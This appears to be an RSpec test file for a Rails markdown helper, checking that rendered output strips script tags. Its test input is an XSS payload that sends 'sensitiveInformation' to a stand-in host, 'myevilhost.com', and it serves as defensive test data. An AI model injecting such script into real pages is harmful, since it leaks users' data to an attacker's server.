require 'rails_helper'

RSpec.describe MarkdownHelper do
  describe 'markdown' do
    it 'does not allow XSS' do
      xss = "<script>$.ajax('myevilhost.com', { data: sensitiveInformation })</script>"
      result = helper.markdown(xss)

      result.should_not include('<script>')
      result.should_not include('</script>')
    end
  end
end
